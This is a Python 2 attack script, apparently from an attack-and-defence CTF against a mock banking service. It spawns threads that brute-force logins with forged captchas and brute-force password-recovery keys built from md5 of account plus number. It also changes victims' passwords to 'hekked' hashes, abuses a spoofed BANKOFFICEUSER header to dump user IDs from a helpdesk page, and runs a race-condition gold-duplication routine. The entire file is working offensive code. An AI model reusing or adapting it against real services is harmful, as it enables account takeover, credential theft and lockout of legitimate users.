from brutes import Bruter, Bruter_Enemy
from generators import Generator, Generator_numeric, Generator_enemy
from misc import  my_url_open, OrderedSet, add_good, BaseForAll, account_data
from config import LOGGER, TARGET_HOST, FORCE_STEAL, MY_LOGIN, MY_PASSWORD, NEW_PASSWORD, DUPE_GOLD
from my_queues import  GOOD, CHANGE, RECOVER, known_users

import urllib
import urllib2
import cookielib

from hashlib import sha1, md5

import random
import time
import re

import threading
from race_exploit import RaceObject

def get_helpdesk():
    opener = urllib2.build_opener()
    req = urllib2.Request('http://{0}/helpdesk/pswdcheck.php'.format(TARGET_HOST), headers={'BANKOFFICEUSER': '1'})
    data = my_url_open(opener, req)
    if 'Charsets' in data:
        pass
    return data


class Stealer(BaseForAll):
    def __init__(self):
        super(Stealer, self).__init__()

    def run(self):
        LOGGER.info('Start stealer')
        while 1:
            try:
                obj = GOOD.get(timeout=2)
            except Exception as e:
                LOGGER.error('Unknown error in Stealer')
                continue
            if FORCE_STEAL:
                self.do_otp(obj)

            CHANGE.put(obj)
            GOOD.task_done()


class Recover(BaseForAll):
    def __init__(self):
        super(Recover, self).__init__()
        self.opener = self.generate_opener()

    def pre_test(self, account):
        req = urllib2.Request(
            'http://{0}/recovery.php?step=step2'.format(TARGET_HOST),
            urllib.urlencode(
                    {'login': str(account).strip()}
            ),
        )
        data = my_url_open(self.opener, req)
        if 'Please enter the key' in data or 'The key has been sent' in data:
            return True
        return False

    def brute_one(self, account, num):
        req = urllib2.Request(
            'http://{0}/recovery.php?step=step3&login={1}'.format(TARGET_HOST, account),
            urllib.urlencode(
                    {'key': md5('{0}{1}'.format(account, num)).hexdigest(), }
            )
        )
        return my_url_open(self.opener, req)

    def check(self, data):
        return 'Transactions' in data

    def run(self):
        while 1:
            self.generate_opener()
            account = RECOVER.get()
            LOGGER.info('Trying to recover: %s', account)
            if account in known_users:
                continue
            if not self.pre_test(account):
                LOGGER.info('Impossible to recover: %s', account)
                continue

            for i in xrange(1, 251):
                data = self.brute_one(account, i)
                if 'Identifier not found' in data:
                    break
                if 'repeat' in data:
                    continue
                result = NEW_PASSWORD.search(data)
                if result:
                    data = self.do_login(account, result.group(1))
                    if self.check(data):
                        LOGGER.critical('RECOVERED: %s %s', account, result.group(1))
                        add_good(account, result.group(1), data, self.opener)
                    break


class Changer(threading.Thread):
    def __init__(self):
        super(Changer, self).__init__()

    def do_change(self, obj):
        LOGGER.info('Changing password for: %s', obj.user)
        req = urllib2.Request('http://{0}/change_password.php'.format(TARGET_HOST),
            urllib.urlencode({
                'password': obj.password,
                'newpassword': sha1('{0}|hekked'.format(obj.user)).hexdigest(),
                'newpassword2': sha1('{0}|hekked'.format(obj.user)).hexdigest(),
                })
        )
        data = my_url_open(obj.opener, req)
        if 'error' not in data:
            LOGGER.critical('Password changed for user: %s', obj.user)
            return True


    def run(self):
        LOGGER.info('Start changer')
        while 1:
            try:
                obj = CHANGE.get(timeout=2)
            except Exception as e:
                LOGGER.error('Unknown error in Changer!')
                continue
            cookiejar = cookielib.CookieJar()
            self.opener = urllib2.build_opener(
                urllib2.HTTPCookieProcessor(cookiejar),
            )

            self.do_change(obj)
            CHANGE.task_done()


class Protector(BaseForAll):
    def __init__(self, dup_gold=False):
        super(Protector, self).__init__()
        self.dup_gold = dup_gold

    def brute_login(self, user, password):
        rand_captcha = str(random.randint(10000, 99999))
        req = urllib2.Request(
            'http://{0}/login.php'.format(TARGET_HOST),
            urllib.urlencode(
                    {
                    'login': user.strip(),
                    'password': password.strip(),
                    'code': rand_captcha,
                    '_code': self.generate_captcha(rand_captcha)
                }
            )
            # TODO: possible headers error
        )
        data = my_url_open(self.opener, req)
        return data

    def run(self):
        while 1:
            self.generate_opener()
            data = self.brute_login(MY_LOGIN, MY_PASSWORD)
            if 'Transactions' in data:
                LOGGER.info('Account protected')
            else:
                LOGGER.critical('Our account hacked!')
            if self.dup_gold:
                obj = account_data(MY_LOGIN, MY_PASSWORD, data, self.opener)
                RaceObject.set_obj(obj)
                with RaceObject.RaceLock:
                    RaceObject.RaceLock.notify()
                    RaceObject.RaceLock.wait()

            time.sleep(0.05)

for i in xrange(1):
    protect = Protector(DUPE_GOLD)
    protect.start()
gen = Generator()
gen.start()

gen = Generator_enemy()
gen.start()
LOGGER.debug('Generators started')

if True:
    for i in xrange(3):
        brute = Bruter()
        brute.start()

    for i in xrange(1):
        steal = Stealer()
        steal.start()

    for i in xrange(1):
        change = Changer()
        change.start()

    for i in xrange(1): # TODO: Conflicts with stealer, can be just nullified
        recov = Recover()
        recov.start()

    for i in xrange(2):
        enemy = Bruter_Enemy()
        enemy.start()

data = get_helpdesk()
logins = re.findall('(?msi)<td>(\d+)</td>[^<]*<td>[^<]*</td>[^<]*<td>(\d+)</td>', data)
LOGGER.critical("%r", logins)

if 1 and logins:
    creator = OrderedSet()
    map(lambda x: creator.add(x[1]), logins)
    for login in logins:
        with open('users{0}.txt'.format(login[1].strip()), 'wb') as f:
            f.write('{0}\n'.format(login[0].strip()))

    map(lambda x: Generator_numeric(int(x)).start(), creator)

#exit()



